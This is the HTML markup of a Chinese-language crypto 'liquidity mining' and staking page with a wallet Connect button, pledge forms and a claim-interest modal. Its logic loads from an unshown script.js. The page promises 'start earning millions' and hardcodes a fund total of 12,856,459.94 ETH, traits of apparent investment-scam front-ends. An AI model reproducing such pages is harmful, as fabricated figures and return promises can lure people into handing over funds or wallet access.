<!DOCTYPE html>
<html lang="zh-Hant">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>熱門挖礦</title>
  <link rel="stylesheet" href="styles.css" />
</head>
<body>
  <div class="app-container">
    <!-- Status -->
    <div id="status"></div>

    <!-- Header -->
    <div class="header">
      <div class="logo" id="title">熱門挖礦</div>
      <select id="languageSelect" class="language-select">
        <option value="zh-Hant">繁</option>
        <option value="zh-Hans">简</option>
        <option value="en">EN</option>
      </select>
    </div>
    <p class="subtitle" id="subtitle">開始賺取數百萬</p>

    <!-- Total Funds -->
    <div class="total-funds">
      <div class="total-value" id="totalValue">12,856,459.94 ETH</div>
    </div>

    <!-- Tabs -->
    <div class="tabs">
      <div class="tab active" data-tab="liquidity">流動性</div>
      <div class="tab" data-tab="pledging">質押</div>
    </div>

    <!-- Liquidity Tab -->
    <div id="liquidity" class="content-section active">
      <div class="stats">
        <div class="stat">
          <div class="stat-label" id="grossOutputLabel">總產出</div>
          <div class="stat-value" id="grossOutputValue">0 ETH</div>
        </div>
        <div class="stat">
          <div class="stat-label" id="cumulativeLabel">累計</div>
          <div class="inline-flex">
            <div class="stat-value" id="cumulativeValue">0 ETH</div>
            <!-- 動態插入 ⚡ 按鈕 -->
            <div id="claimButtonPlaceholder"></div>
          </div>
        </div>
        <div class="stat">
          <div class="stat-label" id="walletBalanceLabel">錢包餘額</div>
          <div class="inline-flex">
            <div class="stat-value" id="walletBalanceAmount">0.000</div>
            <div id="refreshWallet" class="icon-btn" title="刷新">🔄</div>
          </div>
        </div>
        <div class="stat">
          <div class="stat-label" id="accountBalanceLabel">帳戶餘額</div>
          <div class="stat-value" id="accountBalanceValue">0.000 USDT</div>
        </div>
      </div>

      <button id="connectButton" class="connect-btn">Connect</button>
      <button id="startBtn" class="start-btn" style="display: none;">開始</button>

      <div class="next-benefit" id="nextBenefit">下次收益: 00:00:00</div>
    </div>

    <!-- Pledging Tab -->
    <div id="pledging" class="content-section">
      <div class="pledge-form">
        <div class="input-group">
          <div class="input-label" id="pledgeAmountLabel">質押金額</div>
          <input type="number" id="pledgeAmount" class="input-field" placeholder="0" disabled />
        </div>
        <div class="input-group">
          <div class="input-label" id="pledgeDurationLabel">期間</div>
          <select id="pledgeDuration" class="input-field" disabled>
            <option value="30">30 天</option>
            <option value="60">60 天</option>
            <option value="90">90 天</option>
          </select>
        </div>
        <div class="input-group">
          <div class="input-label">代幣</div>
          <select id="pledgeToken" class="input-field" disabled>
            <option value="USDT">USDT</option>
            <option value="USDC">USDC</option>
            <option value="WETH">WETH</option>
          </select>
        </div>
        <button id="pledgeBtn" class="pledge-btn" disabled>立即質押</button>
      </div>

      <div class="pledge-stats">
        <div class="stat">
          <div class="stat-label" id="totalPledgedLabel">總質押</div>
          <div class="stat-value" id="totalPledgedValue">0.00 USDT</div>
        </div>
      </div>
    </div>
  </div>

  <!-- Claim Modal -->
  <div id="claimModal" class="modal" style="display: none;">
    <div class="modal-content">
      <div class="modal-header">
        <h3 id="modalTitle">領取利息</h3>
        <span id="closeModal" class="close">×</span>
      </div>
      <div class="claim-info">
        <div class="info-row">
          <span class="label">可領取 ETH</span>
          <span class="value" id="modalClaimableETH">0.0000000 ETH</span>
        </div>
        <div class="info-row">
          <span class="label">ETH 價格</span>
          <span class="value" id="modalEthPrice">$0.00</span>
        </div>
        <div class="info-row">
          <span class="label">選擇代幣</span>
          <span class="value" id="modalSelectedToken">USDT</span>
        </div>
        <div class="info-row">
          <span class="label">等值金額</span>
          <span class="value" id="modalEquivalentValue">0.000 USDT</span>
        </div>
      </div>
      <div class="modal-footer">
        <button id="confirmClaim" class="confirm-btn">確認領取</button>
        <button id="cancelClaim" class="cancel-btn">取消</button>
      </div>
    </div>
  </div>

  <!-- 動態載入 script.js -->
  <script>
    const script = document.createElement('script');
    script.src = 'script.js';
    script.type = 'text/javascript';
    document.head.appendChild(script);
  </script>
</body>
</html>
